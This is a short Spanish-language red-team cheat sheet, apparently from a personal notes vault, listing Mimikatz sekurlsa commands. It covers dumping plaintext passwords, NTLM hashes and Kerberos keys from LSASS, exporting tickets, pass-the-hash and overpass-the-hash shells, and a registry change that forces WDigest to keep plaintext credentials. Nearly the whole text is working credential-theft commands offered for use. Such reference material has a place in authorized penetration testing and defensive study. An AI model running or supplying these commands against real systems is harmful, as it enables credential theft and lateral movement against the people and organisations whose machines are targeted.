---
aliases:
  - Mimikatz sekurlsa
tags:
  - technique/credential-access
  - env/windows
  - tool/mimikatz
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[LSASS Dumping]]"
  - "[[Pass-the-Hash]]"
---
# Mimikatz - sekurlsa (Credenciales en Memoria)

> Lee credenciales de LSASS. Requiere admin local + `SeDebugPrivilege` (`privilege::debug`).

---

## Dump de Credenciales

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `privilege::debug` | Habilita SeDebugPrivilege | Siempre primero. |
| `sekurlsa::logonpasswords` | Passwords plain / NTLM / Kerberos de sesiones activas | Dump principal. |
| `sekurlsa::msv` | Solo hashes NTLM | Targeted. |
| `sekurlsa::wdigest` | Credenciales WDigest (plaintext, Win <2012R2) | Hosts legacy. |
| `sekurlsa::credman` | Credentials del Credential Manager | Secrets guardados. |
| `sekurlsa::ekeys` | Claves Kerberos AES | Para Overpass-the-Hash con AES. |
^mimi-sekurlsa

## Tickets y Pass-the-Hash

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `sekurlsa::tickets /export` | Exporta tickets Kerberos de todas las sesiones (`.kirbi`) | Pass-the-Ticket. |
| `sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTHASH /run:cmd.exe` | Shell con el hash inyectado (PtH) | [[Pass-the-Hash]]. |
| `sekurlsa::pth /user:Administrator /domain:corp.local /aes256:AES_KEY /run:cmd.exe` | PtH con clave AES | Over-PtH. |
^mimi-sekurlsa-pth

### Forzar WDigest plaintext (próximo logon)

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
:: Esperar re-login → sekurlsa::wdigest devuelve plaintext
```

> Dumpear LSASS sin mimikatz on-host (comsvcs/procdump + parse offline): [[Mimikatz - Dump y PPL Bypass]].
